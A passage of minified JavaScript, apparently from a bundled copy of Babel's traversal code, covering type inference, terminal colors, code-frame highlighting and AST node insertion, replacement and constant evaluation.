X;if(X=Aj.call(this)||Rj(),tC1(X)||nC1(X))X=X.typeAnnotation;return this.setData("typeAnnotation",X),X}var xW=new WeakSet;function Aj(){let X=this.node;if(!X)if(this.key==="init"&&this.parentPath.isVariableDeclarator()){let Q=this.parentPath.parentPath,Y=Q.parentPath;if(Q.key==="left"&&Y.isForInStatement())return JP1();if(Q.key==="left"&&Y.isForOfStatement())return Rj();return QP1()}else return;if(X.typeAnnotation)return X.typeAnnotation;if(xW.has(X))return;xW.add(X);try{var J;let Q=Oj[X.type];if(Q)return Q.call(this,X);if(Q=Oj[this.parentPath.type],(J=Q)!=null&&J.validParent)return this.parentPath.getTypeAnnotation()}finally{xW.delete(X)}}function WP1(X,J){return hW(X,this.getTypeAnnotation(),J)}function hW(X,J,Q){if(X==="string")return rC1(J);else if(X==="number")return iC1(J);else if(X==="boolean")return uC1(J);else if(X==="any")return N4(J);else if(X==="mixed")return dC1(J);else if(X==="empty")return cC1(J);else if(X==="void")return XP1(J);else if(Q)return!1;else throw Error(`Unknown base type ${X}`)}function GP1(X){let J=this.getTypeAnnotation();if(N4(J))return!0;if(eC1(J)){for(let Q of J.types)if(N4(Q)||hW(X,Q,!0))return!0;return!1}else return hW(X,J,!0)}function HP1(X){let J=this.getTypeAnnotation(),Q=X.getTypeAnnotation();if(!N4(J)&&lC1(J))return Q.type===J.type;return!1}function zP1(X){let J=this.getTypeAnnotation();if(X==="Array"){if(aC1(J)||mC1(J)||oC1(J))return!0}return pC1(J)&&Fj(J.id,{name:X})||sC1(J)&&Fj(J.typeName,{name:X})}});var Ij=v((ps1,yW)=>{var I4=process||{},Nj=I4.argv||[],L4=I4.env||{},BP1=!(!!L4.NO_COLOR||Nj.includes("--no-color"))&&(!!L4.FORCE_COLOR||Nj.includes("--color")||I4.platform==="win32"||(I4.stdout||{}).isTTY&&L4.TERM!=="dumb"||!!L4.CI),MP1=(X,J,Q=X)=>(Y)=>{let W=""+Y,G=W.indexOf(J,X.length);return~G?X+jP1(W,J,Q,G)+J:X+W+J},jP1=(X,J,Q,Y)=>{let W="",G=0;do W+=X.substring(G,Y)+Q,G=Y+J.length,Y=X.indexOf(J,G);while(~Y);return W+X.substring(G)},Lj=(X=BP1)=>{let J=X?MP1:()=>String;return{isColorSupported:X,reset:J("\x1B[0m","\x1B[0m"),bold:J("\x1B[1m","\x1B[22m","\x1B[22m\x1B[1m"),dim:J("\x1B[2m","\x1B[22m","\x1B[22m\x1B[2m"),italic:J("\x1B[3m","\x1B[23m"),underline:J("\x1B[4m","\x1B[24m"),inverse:J("\x1B[7m","\x1B[27m"),hidden:J("\x1B[8m","\x1B[28m"),strikethrough:J("\x1B[9m","\x1B[29m"),black:J("\x1B[30m","\x1B[39m"),red:J("\x1B[31m","\x1B[39m"),green:J("\x1B[32m","\x1B[39m"),yellow:J("\x1B[33m","\x1B[39m"),blue:J("\x1B[34m","\x1B[39m"),magenta:J("\x1B[35m","\x1B[39m"),cyan:J("\x1B[36m","\x1B[39m"),white:J("\x1B[37m","\x1B[39m"),gray:J("\x1B[90m","\x1B[39m"),bgBlack:J("\x1B[40m","\x1B[49m"),bgRed:J("\x1B[41m","\x1B[49m"),bgGreen:J("\x1B[42m","\x1B[49m"),bgYellow:J("\x1B[43m","\x1B[49m"),bgBlue:J("\x1B[44m","\x1B[49m"),bgMagenta:J("\x1B[45m","\x1B[49m"),bgCyan:J("\x1B[46m","\x1B[49m"),bgWhite:J("\x1B[47m","\x1B[49m"),blackBright:J("\x1B[90m","\x1B[39m"),redBright:J("\x1B[91m","\x1B[39m"),greenBright:J("\x1B[92m","\x1B[39m"),yellowBright:J("\x1B[93m","\x1B[39m"),blueBright:J("\x1B[94m","\x1B[39m"),magentaBright:J("\x1B[95m","\x1B[39m"),cyanBright:J("\x1B[96m","\x1B[39m"),whiteBright:J("\x1B[97m","\x1B[39m"),bgBlackBright:J("\x1B[100m","\x1B[49m"),bgRedBright:J("\x1B[101m","\x1B[49m"),bgGreenBright:J("\x1B[102m","\x1B[49m"),bgYellowBright:J("\x1B[103m","\x1B[49m"),bgBlueBright:J("\x1B[104m","\x1B[49m"),bgMagentaBright:J("\x1B[105m","\x1B[49m"),bgCyanBright:J("\x1B[106m","\x1B[49m"),bgWhiteBright:J("\x1B[107m","\x1B[49m")}};yW.exports=Lj();yW.exports.createColors=Lj});var Pj=v((Cj)=>{Object.defineProperty(Cj,"__esModule",{value:!0});Cj.default=/((['"])(?:(?!\2|\\).|\\(?:\r\n|[\s\S]))*(\2)?|`(?:[^`\\$]|\\[\s\S]|\$(?!\{)|\$\{(?:[^{}]|\{[^}]*\}?)*\}?)*(`)?)|(\/\/.*)|(\/\*(?:[^*]|\*(?!\/))*(\*\/)?)|(\/(?!\*)(?:\[(?:(?![\]\\]).|\\.)*\]|(?![\/\]\\]).|\\.)+\/(?:(?!\s*(?:\b|[\u0080-\uFFFF$\\'"~({]|[+\-!](?!=)|\.?\d))|[gmiyus]{1,6}\b(?![\u0080-\uFFFF$\\]|\s*(?:[+\-*%&|^<>!=?({]|\/(?![\/*])))))|(0[xX][\da-fA-F]+|0[oO][0-7]+|0[bB][01]+|(?:\d*\.\d+|\d+\.?)(?:[eE][+-]?\d+)?)|((?!\d)(?:(?!\s)[$\w\u0080-\uFFFF]|\\u[\da-fA-F]{4}|\\u\{[\da-fA-F]+\})+)|(--|\+\+|&&|\|\||=>|\.{3}|(?:[+\-\/%&|^]|\*{1,2}|<{1,2}|>{1,3}|!=?|={1,2})=?|[?~.,:;[\](){}])|(\s+)|(^$|[\s\S])/g;Cj.matchToToken=function(X){var J={type:"invalid",value:X[0],closed:void 0};if(X[1])J.type="string",J.closed=!!(X[3]||X[4]);else if(X[5])J.type="comment";else if(X[6])J.type="comment",J.closed=!!X[7];else if(X[8])J.type="regex";else if(X[9])J.type="number";else if(X[10])J.type="name";else if(X[11])J.type="punctuator";else if(X[12])J.type="whitespace";return J}});var mW=v((hj)=>{Object.defineProperty(hj,"__esModule",{value:!0});var gW=Ij(),Sj=Pj(),Tj=tJ();function RP1(){return typeof process==="object"&&(process.env.FORCE_COLOR==="0"||process.env.FORCE_COLOR==="false")?!1:gW.isColorSupported}var C4=(X,J)=>(Q)=>X(J(Q));function kj(X){return{keyword:X.cyan,capitalized:X.yellow,jsxIdentifier:X.yellow,punctuator:X.yellow,number:X.magenta,string:X.green,regex:X.magenta,comment:X.gray,invalid:C4(C4(X.white,X.bgRed),X.bold),gutter:X.gray,marker:C4(X.red,X.bold),message:C4(X.red,X.bold),reset:X.reset}}var AP1=kj(gW.createColors(!0)),DP1=kj(gW.createColors(!1));function bj(X){return X?AP1:DP1}var wP1=new Set(["as","async","from","get","of","set"]),NP1=/\r\n|[\n\r\u2028\u2029]/,LP1=/^[()[\]{}]$/,vj;{let X=/^[a-z][\w-]*$/i,J=function(Q,Y,W){if(Q.type==="name"){if(Tj.isKeyword(Q.value)||Tj.isStrictReservedWord(Q.value,!0)||wP1.has(Q.value))return"keyword";if(X.test(Q.value)&&(W[Y-1]==="<"||W.slice(Y-2,Y)==="</"))return"jsxIdentifier";if(Q.value[0]!==Q.value[0].toLowerCase())return"capitalized"}if(Q.type==="punctuator"&&LP1.test(Q.value))return"bracket";if(Q.type==="invalid"&&(Q.value==="@"||Q.value==="#"))return"punctuator";return Q.type};vj=function*(Q){let Y;while(Y=Sj.default.exec(Q)){let W=Sj.matchToToken(Y);yield{type:J(W,Y.index,Q),value:W.value}}}}function fj(X){if(X==="")return"";let J=bj(!0),Q="";for(let{type:Y,value:W}of vj(X))if(Y in J)Q+=W.split(NP1).map((G)=>J[Y](G)).join(`
`);else Q+=W;return Q}var _j=!1,Ej=/\r\n|[\n\r\u2028\u2029]/;function IP1(X,J,Q){let Y=Object.assign({column:0,line:-1},X.start),W=Object.assign({},Y,X.end),{linesAbove:G=2,linesBelow:H=3}=Q||{},z=Y.line,$=Y.column,V=W.line,K=W.column,Z=Math.max(z-(G+1),0),q=Math.min(J.length,V+H);if(z===-1)Z=0;if(V===-1)q=J.length;let B=V-z,M={};if(B)for(let O=0;O<=B;O++){let R=O+z;if(!$)M[R]=!0;else if(O===0){let I=J[R-1].length;M[R]=[$,I-$+1]}else if(O===B)M[R]=[0,K];else{let I=J[R-O].length;M[R]=[0,I]}}else if($===K)if($)M[z]=[$,0];else M[z]=!0;else M[z]=[$,K-$];return{start:Z,end:q,markerLines:M}}function xj(X,J,Q={}){let Y=Q.forceColor||RP1()&&Q.highlightCode,W=bj(Y),G=X.split(Ej),{start:H,end:z,markerLines:$}=IP1(J,G,Q),V=J.start&&typeof J.start.column==="number",K=String(z).length,q=(Y?fj(X):X).split(Ej,z).slice(H,z).map((B,M)=>{let O=H+1+M,I=` ${` ${O}`.slice(-K)} |`,F=$[O],T=!$[O+1];if(F){let b="";if(Array.isArray(F)){let h=B.slice(0,Math.max(F[0]-1,0)).replace(/[^\t]/g," "),L=F[1]||1;if(b=[`
 `,W.gutter(I.replace(/\d/g," "))," ",h,W.marker("^").repeat(L)].join(""),T&&Q.message)b+=" "+W.message(Q.message)}return[W.marker(">"),W.gutter(I),B.length>0?` ${B}`:"",b].join("")}else return` ${W.gutter(I)}${B.length>0?` ${B}`:""}`}).join(`
`);if(Q.message&&!V)q=`${" ".repeat(K+1)}${Q.message}
${q}`;if(Y)return W.reset(q);else return q}function CP1(X,J,Q,Y={}){if(!_j){_j=!0;let G="Passing lineNumber and colNumber is deprecated to @babel/code-frame. Please use `codeFrameColumns`.";if(process.emitWarning)process.emitWarning(G,"DeprecationWarning");else{let H=Error(G);H.name="DeprecationWarning",console.warn(Error(G))}}return Q=Math.max(Q,0),xj(X,{start:{column:Q,line:J}},Y)}hj.codeFrameColumns=xj;hj.default=CP1;hj.highlight=fj});var mj=v((yj)=>{Object.defineProperty(yj,"__esModule",{value:!0});yj.hooks=void 0;var rs1=yj.hooks=[function(X,J){if(X.key==="test"&&(J.isWhile()||J.isSwitchCase())||X.key==="declaration"&&J.isExportDeclaration()||X.key==="body"&&J.isLabeledStatement()||X.listKey==="declarations"&&J.isVariableDeclaration()&&J.node.declarations.length===1||X.key==="expression"&&J.isExpressionStatement())return J.remove(),!0},function(X,J){if(J.isSequenceExpression()&&J.node.expressions.length===1)return J.replaceWith(J.node.expressions[0]),!0},function(X,J){if(J.isBinary()){if(X.key==="left")J.replaceWith(J.node.right);else J.replaceWith(J.node.left);return!0}},function(X,J){if(J.isIfStatement()&&X.key==="consequent"||X.key==="body"&&(J.isLoop()||J.isArrowFunctionExpression()))return X.replaceWith({type:"BlockStatement",body:[]}),!0}]});var P4=v((ij)=>{Object.defineProperty(ij,"__esModule",{value:!0});ij._assertUnremoved=dj;ij._callRemovalHooks=lj;ij._markRemoved=uW;ij._remove=pj;ij._removeFromScope=cj;ij.remove=hP1;var _P1=mj(),EP1=gX(),kP1=cW(),uj=v6(),bP1=y1(),vP1=S4(),fP1=l9(),{getBindingIdentifiers:xP1}=bP1;function hP1(){var X;if(dj.call(this),fP1.resync.call(this),lj.call(this)){uW.call(this);return}if(!((X=this.opts)!=null&&X.noScope))cj.call(this);this.shareCommentsWithSiblings(),pj.call(this),uW.call(this)}function cj(){let X=xP1(this.node,!1,!1,!0);Object.keys(X).forEach((J)=>this.scope.removeBinding(J))}function lj(){if(this.parentPath){for(let X of _P1.hooks)if(X(this,this.parentPath))return!0}}function pj(){if(Array.isArray(this.container))this.container.splice(this.key,1),vP1.updateSiblingKeys.call(this,this.key,-1);else kP1._replaceWith.call(this,null)}function uW(){if(this._traverseFlags|=uj.SHOULD_SKIP|uj.REMOVED,this.parent){var X;(X=(0,EP1.getCachedPaths)(this))==null||X.delete(this.node)}this.node=null}function dj(){if(this.removed)throw this.buildCodeFrameError("NodePath has been removed so is read-only.")}});var oj=v((nj)=>{Object.defineProperty(nj,"__esModule",{value:!0});nj.default=void 0;var rj=y1(),pP1=rj,{react:dP1}=rj,{cloneNode:iP1,jsxExpressionContainer:rP1,variableDeclaration:aP1,variableDeclarator:nP1}=pP1,sP1={ReferencedIdentifier(X,J){if(X.isJSXIdentifier()&&dP1.isCompatTag(X.node.name)&&!X.parentPath.isJSXMemberExpression())return;if(X.node.name==="this"){let Y=X.scope;do if(Y.path.isFunction()&&!Y.path.isArrowFunctionExpression())break;while(Y=Y.parent);if(Y)J.breakOnScopePaths.push(Y.path)}let Q=X.scope.getBinding(X.node.name);if(!Q)return;for(let Y of Q.constantViolations)if(Y.scope!==Q.path.scope){J.mutableBinding=!0,X.stop();return}if(Q!==J.scope.getBinding(X.node.name))return;J.bindings[X.node.name]=Q}};class aj{constructor(X,J){this.breakOnScopePaths=void 0,this.bindings=void 0,this.mutableBinding=void 0,this.scopes=void 0,this.scope=void 0,this.path=void 0,this.attachAfter=void 0,this.breakOnScopePaths=[],this.bindings={},this.mutableBinding=!1,this.scopes=[],this.scope=J,this.path=X,this.attachAfter=!1}isCompatibleScope(X){for(let J of Object.keys(this.bindings)){let Q=this.bindings[J];if(!X.bindingIdentifierEquals(J,Q.identifier))return!1}return!0}getCompatibleScopes(){let X=this.path.scope;do{if(this.isCompatibleScope(X))this.scopes.push(X);else break;if(this.breakOnScopePaths.includes(X.path))break}while(X=X.parent)}getAttachmentPath(){let X=this._getAttachmentPath();if(!X)return;let J=X.scope;if(J.path===X)J=X.scope.parent;if(J.path.isProgram()||J.path.isFunction())for(let Q of Object.keys(this.bindings)){if(!J.hasOwnBinding(Q))continue;let Y=this.bindings[Q];if(Y.kind==="param"||Y.path.parentKey==="params")continue;if(this.getAttachmentParentForPath(Y.path).key>=X.key){this.attachAfter=!0,X=Y.path;for(let G of Y.constantViolations)if(this.getAttachmentParentForPath(G).key>X.key)X=G}}return X}_getAttachmentPath(){let J=this.scopes.pop();if(!J)return;if(J.path.isFunction())if(this.hasOwnParamBindings(J)){if(this.scope===J)return;let Q=J.path.get("body").get("body");for(let Y=0;Y<Q.length;Y++){if(Q[Y].node._blockHoist)continue;return Q[Y]}}else return this.getNextScopeAttachmentParent();else if(J.path.isProgram())return this.getNextScopeAttachmentParent()}getNextScopeAttachmentParent(){let X=this.scopes.pop();if(X)return this.getAttachmentParentForPath(X.path)}getAttachmentParentForPath(X){do if(!X.parentPath||Array.isArray(X.container)&&X.isStatement())return X;while(X=X.parentPath)}hasOwnParamBindings(X){for(let J of Object.keys(this.bindings)){if(!X.hasOwnBinding(J))continue;let Q=this.bindings[J];if(Q.kind==="param"&&Q.constant)return!0}return!1}run(){if(this.path.traverse(sP1,this),this.mutableBinding)return;this.getCompatibleScopes();let X=this.getAttachmentPath();if(!X)return;if(X.getFunctionParent()===this.path.getFunctionParent())return;let J=X.scope.generateUidIdentifier("ref"),Q=nP1(J,this.path.node),Y=this.attachAfter?"insertAfter":"insertBefore",[W]=X[Y]([X.isVariableDeclarator()?Q:aP1("var",[Q])]),G=this.path.parentPath;if(G.isJSXElement()&&this.path.container===G.node.children)J=rP1(J);return this.path.replaceWith(iP1(J)),X.isVariableDeclarator()?W.get("init"):W.get("declarations.0.init")}}nj.default=aj});var S4=v((WO)=>{Object.defineProperty(WO,"__esModule",{value:!0});WO._containerInsert=rW;WO._containerInsertAfter=XO;WO._containerInsertBefore=aW;WO._verifyNodeList=F7;WO.insertAfter=qS1;WO.insertBefore=US1;WO.pushContainer=MS1;WO.unshiftContainer=BS1;WO.updateSiblingKeys=YO;var oP1=gX(),iW=v6(),lW=l9(),T4=P4(),tP1=y1(),eP1=oj(),{arrowFunctionExpression:XS1,assertExpression:JS1,assignmentExpression:QS1,blockStatement:tj,callExpression:YS1,cloneNode:pW,expressionStatement:dW,isAssignmentExpression:WS1,isCallExpression:GS1,isExportNamedDeclaration:ej,isExpression:HS1,isIdentifier:zS1,isSequenceExpression:$S1,isSuper:VS1,thisExpression:KS1}=tP1;function US1(X){T4._assertUnremoved.call(this);let J=F7.call(this,X),{parentPath:Q,parent:Y}=this;if(Q.isExpressionStatement()||Q.isLabeledStatement()||ej(Y)||Q.isExportDefaultDeclaration()&&this.isDeclaration())return Q.insertBefore(J);else if(this.isNodeType("Expression")&&!this.isJSXElement()||Q.isForStatement()&&this.key==="init"){if(this.node)J.push(this.node);return this.replaceExpressionWithStatements(J)}else if(Array.isArray(this.container))return aW.call(this,J);else if(this.isStatementOrBlock()){let W=this.node,G=W&&(!this.isExpressionStatement()||W.expression!=null);return this.replaceWith(tj(G?[W]:[])),this.unshiftContainer("body",J)}else throw Error("We don't know what to do with this node type. We were previously a Statement but we can't fit in here?")}function rW(X,J){YO.call(this,X,J.length);let Q=[];this.container.splice(X,0,...J);for(let G=0;G<J.length;G++){var Y;let H=X+G,z=this.getSibling(H);if(Q.push(z),(Y=this.context)!=null&&Y.queue)lW.pushContext.call(z,this.context)}let W=lW._getQueueContexts.call(this);for(let G of Q){lW.setScope.call(G),G.debug("Inserted.");for(let H of W)H.maybeQueue(G,!0)}return Q}function aW(X){return rW.call(this,this.key,X)}function XO(X){return rW.call(this,this.key+1,X)}var JO=(X)=>X[X.length-1];function QO(X){return $S1(X.parent)&&(JO(X.parent.expressions)!==X.node||QO(X.parentPath))}function ZS1(X,J){if(!WS1(X)||!zS1(X.left))return!1;let Q=J.getBlockParent();return Q.hasOwnBinding(X.left.name)&&Q.getOwnBinding(X.left.name).constantViolations.length<=1}function qS1(X){if(T4._assertUnremoved.call(this),this.isSequenceExpression())return JO(this.get("expressions")).insertAfter(X);let J=F7.call(this,X),{parentPath:Q,parent:Y}=this;if(Q.isExpressionStatement()||Q.isLabeledStatement()||ej(Y)||Q.isExportDefaultDeclaration()&&this.isDeclaration())return Q.insertAfter(J.map((W)=>{return HS1(W)?dW(W):W}));else if(this.isNodeType("Expression")&&!this.isJSXElement()&&!Q.isJSXElement()||Q.isForStatement()&&this.key==="init"){let W=this;if(W.node){let G=W.node,{scope:H}=this;if(H.path.isPattern())return JS1(G),W.replaceWith(YS1(XS1([],G),[])),W.get("callee.body").insertAfter(J),[W];if(QO(W))J.unshift(G);else if(GS1(G)&&VS1(G.callee))J.unshift(G),J.push(KS1());else if(ZS1(G,H))J.unshift(G),J.push(pW(G.left));else if(H.isPure(G,!0))J.push(G);else{if(Q.isMethod({computed:!0,key:G}))H=H.parent;let z=H.generateDeclaredUidIdentifier();J.unshift(dW(QS1("=",pW(z),G))),J.push(dW(pW(z)))}}return this.replaceExpressionWithStatements(J)}else if(Array.isArray(this.container))return XO.call(this,J);else if(this.isStatementOrBlock()){let W=this.node,G=W&&(!this.isExpressionStatement()||W.expression!=null);return this.replaceWith(tj(G?[W]:[])),this.pushContainer("body",J)}else throw Error("We don't know what to do with this node type. We were previously a Statement but we can't fit in here?")}function YO(X,J){if(!this.parent)return;let Q=(0,oP1.getCachedPaths)(this);if(!Q)return;for(let[,Y]of Q)if(typeof Y.key==="number"&&Y.container===this.container&&Y.key>=X)Y.key+=J}function F7(X){if(!X)return[];if(!Array.isArray(X))X=[X];for(let J=0;J<X.length;J++){let Q=X[J],Y;if(!Q)Y="has falsy node";else if(typeof Q!=="object")Y="contains a non-object node";else if(!Q.type)Y="without a type";else if(Q instanceof iW.default)Y="has a NodePath when it expected a raw object";if(Y){let W=Array.isArray(Q)?"array":typeof Q;throw Error(`Node list ${Y} with the index of ${J} and type of ${W}`)}}return X}function BS1(X,J){T4._assertUnremoved.call(this),J=F7.call(this,J);let Q=iW.default.get({parentPath:this,parent:this.node,container:this.node[X],listKey:X,key:0}).setContext(this.context);return aW.call(Q,J)}function MS1(X,J){T4._assertUnremoved.call(this);let Q=F7.call(this,J),Y=this.node[X];return iW.default.get({parentPath:this,parent:this.node,container:Y,listKey:X,key:Y.length}).setContext(this.context).replaceWithMultiple(Q)}WO.hoist=function(J=this.scope){return new eP1.default(this,J).run()}});var cW=v((qO)=>{Object.defineProperty(qO,"__esModule",{value:!0});qO._replaceWith=ZO;qO.replaceExpressionWithStatements=tS1;qO.replaceInline=eS1;qO.replaceWith=oS1;qO.replaceWithMultiple=nS1;qO.replaceWithSourceString=sS1;var IS1=mW(),sW=K7(),CS1=v6(),VO=gX(),oW=S4(),PS1=y5(),SS1=y1(),s8=l9(),{FUNCTION_TYPES:GO,arrowFunctionExpression:TS1,assignmentExpression:KO,awaitExpression:_S1,blockStatement:ES1,buildUndefinedNode:nW,callExpression:kS1,cloneNode:tW,conditionalExpression:bS1,expressionStatement:vS1,getBindingIdentifiers:fS1,identifier:xS1,inheritLeadingComments:hS1,inheritTrailingComments:yS1,inheritsComments:gS1,isBlockStatement:mS1,isEmptyStatement:HO,isExpression:UO,isExpressionStatement:uS1,isIfStatement:cS1,isProgram:lS1,isStatement:pS1,isVariableDeclaration:dS1,removeComments:iS1,returnStatement:zO,sequenceExpression:rS1,validate:$O,yieldExpression:aS1}=SS1;function nS1(X){var J;s8.resync.call(this),X=oW._verifyNodeList.call(this,X),hS1(X[0],this.node),yS1(X[X.length-1],this.node),(J=(0,VO.getCachedPaths)(this))==null||J.delete(this.node),this.node=this.container[this.key]=null;let Q=this.insertAfter(X);if(this.node)this.requeue();else this.remove();return Q}function sS1(X){s8.resync.call(this);let J;try{X=`(${X})`,J=(0,PS1.parse)(X)}catch(Y){let W=Y.loc;if(W)Y.message+=` - make sure this is an expression.
`+(0,IS1.codeFrameColumns)(X,{start:{line:W.line,column:W.column+1}}),Y.code="BABEL_REPLACE_SOURCE_ERROR";throw Y}let Q=J.program.body[0].expression;return sW.default.removeProperties(Q),this.replaceWith(Q)}function oS1(X){if(s8.resync.call(this),this.removed)throw Error("You can't replace this node, we've already removed it");let J=X instanceof CS1.default?X.node:X;if(!J)throw Error("You passed `path.replaceWith()` a falsy node, use `path.remove()` instead");if(this.node===J)return[this];if(this.isProgram()&&!lS1(J))throw Error("You can only replace a Program root node with another Program node");if(Array.isArray(J))throw Error("Don't use `path.replaceWith()` with an array of nodes, use `path.replaceWithMultiple()`");if(typeof J==="string")throw Error("Don't use `path.replaceWith()` with a source string, use `path.replaceWithSourceString()`");let Q="";if(this.isNodeType("Statement")&&UO(J)){if(!this.canHaveVariableDeclarationOrExpression()&&!this.canSwapBetweenExpressionAndStatement(J)&&!this.parentPath.isExportDefaultDeclaration())J=vS1(J),Q="expression"}if(this.isNodeType("Expression")&&pS1(J)){if(!this.canHaveVariableDeclarationOrExpression()&&!this.canSwapBetweenExpressionAndStatement(J))return this.replaceExpressionWithStatements([J])}let Y=this.node;if(Y)gS1(J,Y),iS1(Y);return ZO.call(this,J),this.type=J.type,s8.setScope.call(this),this.requeue(),[Q?this.get(Q):this]}function ZO(X){var J;if(!this.container)throw ReferenceError("Container is falsy");if(this.inList)$O(this.parent,this.key,[X]);else $O(this.parent,this.key,X);this.debug(`Replace with ${X==null?void 0:X.type}`),(J=(0,VO.getCachedPaths)(this))==null||J.set(X,this).delete(this.node),this.node=this.container[this.key]=X}function tS1(X){s8.resync.call(this);let J=[],Q=_4(X,J);if(Q){for(let q of J)this.scope.push({id:q});return this.replaceWith(Q)[0].get("expressions")}let Y=this.getFunctionParent(),W=Y==null?void 0:Y.node.async,G=Y==null?void 0:Y.node.generator,H=TS1([],ES1(X));this.replaceWith(kS1(H,[]));let z=this.get("callee");z.get("body").scope.hoistVariables((q)=>this.scope.push({id:q}));let $=z.getCompletionRecords();for(let q of $){if(!q.isExpressionStatement())continue;let B=q.findParent((M)=>M.isLoop());if(B){let M=B.getData("expressionReplacementReturnUid");if(!M)M=z.scope.generateDeclaredUidIdentifier("ret"),z.get("body").pushContainer("body",zO(tW(M))),B.setData("expressionReplacementReturnUid",M);else M=xS1(M.name);q.get("expression").replaceWith(KO("=",tW(M),q.node.expression))}else q.replaceWith(zO(q.node.expression))}z.arrowFunctionToExpression();let V=z,K=W&&sW.default.hasType(this.get("callee.body").node,"AwaitExpression",GO),Z=G&&sW.default.hasType(this.get("callee.body").node,"YieldExpression",GO);if(K){if(V.set("async",!0),!Z)this.replaceWith(_S1(this.node))}if(Z)V.set("generator",!0),this.replaceWith(aS1(this.node,!0));return V.get("body.body")}function _4(X,J){let Q=[],Y=!0;for(let W of X){if(!HO(W))Y=!1;if(UO(W))Q.push(W);else if(uS1(W))Q.push(W.expression);else if(dS1(W)){if(W.kind!=="var")return;for(let G of W.declarations){let H=fS1(G);for(let z of Object.keys(H))J.push(tW(H[z]));if(G.init)Q.push(KO("=",G.id,G.init))}Y=!0}else if(cS1(W)){let G=W.consequent?_4([W.consequent],J):nW(),H=W.alternate?_4([W.alternate],J):nW();if(!G||!H)return;Q.push(bS1(W.test,G,H))}else if(mS1(W)){let G=_4(W.body,J);if(!G)return;Q.push(G)}else if(HO(W)){if(X.indexOf(W)===0)Y=!0}else return}if(Y)Q.push(nW());if(Q.length===1)return Q[0];else return rS1(Q)}function eS1(X){if(s8.resync.call(this),Array.isArray(X))if(Array.isArray(this.container)){X=oW._verifyNodeList.call(this,X);let J=oW._containerInsertAfter.call(this,X);return this.remove(),J}else return this.replaceWithMultiple(X);else return this.replaceWith(X)}});var FO=v((OO)=>{Object.defineProperty(OO,"__esModule",{value:!0});OO.evaluate=qT1;OO.evaluateTruthy=UT1;var HT1=["Number","String","Math"],zT1=["isFinite","isNaN","parseFloat","parseInt","decodeURI","decodeURIComponent","encodeURI","encodeURIComponent",null,null],$T1=["random"];function BO(X){return HT1.includes(X)}function VT1(X){return zT1.includes(X)}function KT1(X){return $T1.includes(X)}function UT1(){let X=this.evaluate();if(X.confident)return!!X.value}function p9(X,J){if(!J.confident)return;J.deoptPath=X,J.confident=!1}var MO=new Map([["undefined",void 0],["Infinity",1/0],["NaN",NaN]]);function o0(X,J){let{node:Q}=X,{seen:Y}=J;if(Y.has(Q)){let W=Y.get(Q);if(W.resolved)return W.value;else{p9(X,J);return}}else{let W={resolved:!1};Y.set(Q,W);let G=ZT1(X,J);if(J.confident)W.resolved=!0,W.value=G;return G}}function ZT1(X,J){if(!J.confident)return;if(X.isSequenceExpression()){let Y=X.get("expressions");return o0(Y[Y.length-1],J)}if(X.isStringLiteral()||X.isNumericLiteral()||X.isBooleanLiteral())return X.node.value;if(X.isNullLiteral())return null;if(X.isTemplateLiteral())return jO(X,X.node.quasis,J);if(X.isTaggedTemplateExpression()&&X.get("tag").isMemberExpression()){let Y=X.get("tag.object"),{node:{name:W}}=Y,G=X.get("tag.property");if(Y.isIdentifier()&&W==="String"&&!X.scope.getBinding(W)&&G.isIdentifier()&&G.node.name==="raw")return jO(X,X.node.quasi.quasis,J,!0)}if(X.isConditionalExpression()){let Y=o0(X.get("test"),J);if(!J.confident)return;if(Y)return o0(X.get("consequent"),J);else return o0(X.get("alternate"),J)}if(X.isExpressionWrapper())return o0(X.get("expression"),J);if(X.isMemberExpression()&&!X.parentPath.isCallExpression({callee:X.node})){let Y=X.get("property"),W=X.get("object");if(W.isLiteral()){let G=W.node.value,H=typeof G,z=null;if(X.node.computed){if(z=o0(Y,J),!J.confident)return}else if(Y.isIdentifier())z=Y.node.name;if((H==="number"||H==="string")&&z!=null&&(typeof z==="number"||typeof z==="string"))return G[z]}}if(X.isReferencedIdentifier()){let Y=X.scope.getBinding(X.node.name);if(Y){if(Y.constantViolations.length>0||X.node.start<Y.path.node.end){p9(Y.path,J);return}let z=Y.path.scope;if(Y.kind==="var"&&z!==Y.scope){let $=!z.path.parentPath.isBlockStatement();for(let V=z.parent;V;V=V.parent){var Q;if(V===X.scope){if($){p9(Y.path,J);return}break}if((Q=V.path.parentPath)!=null&&Q.isBlockStatement())$=!0}}if(Y.hasValue)return Y.value}let W=X.node.name;if(MO.has(W)){if(!Y)return MO.get(W);p9(Y.path,J);return}let G=X.resolve();if(G===X){p9(X,J);return}let H=o0(G,J);if(typeof H==="object"&&H!==null&&Y.references>1){p9(G,J);return}return H}if(X.isUnaryExpression({prefix:!0})){if(X.node.operator==="void")return;let Y=X.get("argument");if(X.node.operator==="typeof"&&(Y.isFunction()||Y.isClass()))return"function";let W=o0(Y,J);if(!J.confident)return;switch(X.node.operator){case"!":return!W;case"+":return+W;case"-":return-W;case"~":return~W;case"typeof":return typeof W}}if(X.isArrayExpression()){let Y=[],W=X.get("elements");for(let G of W){let H=G.evaluate();if(H.confident)Y.push(H.value);else{p9(H.deopt,J);return}}return Y}if(X.isObjectExpression()){let Y={},W=X.get("properties");for(let G of W){if(G.isObjectMethod()||G.isSpreadElement()){p9(G,J);return}let H=G.get("key"),z;if(G.node.computed){if(z=H.evaluate(),!z.confident){p9(z.deopt,J);return}z=z.value}else if(H.isIdentifier())z=H.node.name;else z=H.node.value;let V=G.get("value").evaluate();if(!V.confident){p9(V.deopt,J);return}V=V.value,Y[z]=V}return Y}if(X.isLogicalExpression()){let Y=J.confident,W=o0(X.get("left"),J),G=J.confident;J.confident=Y;let H=o0(X.get("right"),J),z=J.confident;switch(X.node.operator){case"||":if(J.confident=G&&(!!W||z),!J.confident)return;return W||H;case"&&":if(J.confident=G&&(!W||z),!J.confident)return;return W&&H;case"??":if(J.confident=G&&(W!=null||z),!J.confident)return;return W!=null?W:H}}if(X.isBinaryExpression()){let Y=o0(X.get("left"),J);if(!J.confident)return;let W=o0(X.get("right"),J);if(!J.confident)return;switch(X.node.operator){case"-":return Y-W;case"+":return Y+W;case"/":return Y/W;case"*":return Y*W;case"%":return Y%W;case"**":return Math.pow(Y,W);case"<":return Y<W;case">":return Y>W;case"<=":return Y<=W;case">=":return Y>=W;case"==":return Y==W;case"!=":return Y!=W;case"===":return Y===W;case"!==":return Y!==W;case"|":return Y|W;case"&":return Y&W;case"^":return Y^W;case"<<":return Y<<W;case">>":return Y>>W;case">>>":return Y>>>W}}if(X.isCallExpression()){let 